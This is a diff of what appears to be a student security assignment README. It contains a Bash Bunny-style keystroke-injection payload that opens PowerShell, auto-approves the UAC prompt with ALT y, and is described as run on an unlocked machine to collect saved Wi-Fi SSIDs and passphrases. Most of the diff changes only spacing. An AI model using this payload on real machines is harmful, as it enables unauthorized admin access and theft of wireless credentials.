@@ -32,18 +32,24 @@ ATTACKMODE HID STORAGE
 
 LED B 200
 
-#Launch Powershell As Admin
+# Launch Powershell As Admin
 
 Q GUI r
+
 Q DELAY 100
+
 Q STRING powershell Start-Process powershell // This will start the powershell
+
 Q ENTER
 
 # Bypass UAC
 
 Q DELAY 3000
+
 Q ALT y     // Q ALT y” command means to enter the letter “y” when the UAC prompt is presented 
+
 Q ENTER    // This is for the the UAC elevation permission
+
 Q DELAY 500
 
 
@@ -53,4 +59,3 @@ Then, Plug it into the Unlocked Machine.
 
 Each of these files contains the SSID and where possible (WEP/WPA-PSK &WPA2-PSK), the passphrase:
 
-![alt tag](D:\Studies\Nik_Spring_20_Sem\Cyber_Security\Assignments\Assignment 6\wirelessfiles.jpg)
